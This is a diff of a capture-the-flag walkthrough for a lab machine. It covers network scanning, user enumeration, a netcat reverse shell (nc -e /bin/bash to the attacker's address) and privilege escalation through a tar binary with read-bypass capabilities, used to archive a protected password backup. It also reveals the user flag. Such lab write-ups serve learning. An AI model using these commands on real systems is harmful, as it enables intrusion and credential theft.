@@ -1,4 +1,4 @@
-##  Find IP address
+##  Get User Access
 
 1. scan entire network:
     nmap 10.10.30.0/24
@@ -8,9 +8,9 @@
 
 3. browser
 
-http://10.10.30.60
-https://10.10.30.60:10000
-https://10.10.30.60:20000
+http://10.10.30.60         (apache2 debian default page)
+https://10.10.30.60:10000  (webmin)
+https://10.10.30.60:20000  (usermin)
 
 4. decrypt code from http://10.10.30.60
 
@@ -22,3 +22,56 @@ https://10.10.30.60:20000
   Tool: enum4linux
 
   User: cyber
+
+6. ncat into device
+
+    *setup listner (local)
+    nc -lvnp 4444
+
+    *setup sender (attack device)
+    nc -e /bin/bash 10.10.1.50 4444
+
+7. User access flag :
+
+    3mp!re{You_Manage_to_Break_My_Secure_Access}
+
+
+## Get Root Access
+
+1. Find application or process that can run at higher privilege
+
+    getcap -r / 2>/dev/null
+
+
+    * getcap             =    list capabilities of files
+
+    * -r                 =    recursive (checks sub files and directories)
+
+    * /                  =    denotes root directory
+
+    * 2>/dev/null        =    supress error messages
+
+
+    Results:
+            /home/cyber/tar cap_dac_read_search=ep
+            /usr/bin/ping cap_net_raw=ep
+
+            (ep = effective and permited aka tar is able to bypass file read and directory search permissions)
+
+
+2. navigate to folder with tar
+
+cd /home/cyber
+
+3. create old archive
+
+    ./tar -cvf old_pass /var/backups/.old_pass.bak
+
+
+    * ./tar                            =    run tar application within directory
+    * -cvf                             =    c(create new archive), v(verbose), f(specify name of new archive "old_pass")
+    * /var/backups/.old_pass.bak       =    contects going to be archived
+
+4. extract new archive
+
+    ./tar -xvf old_pass
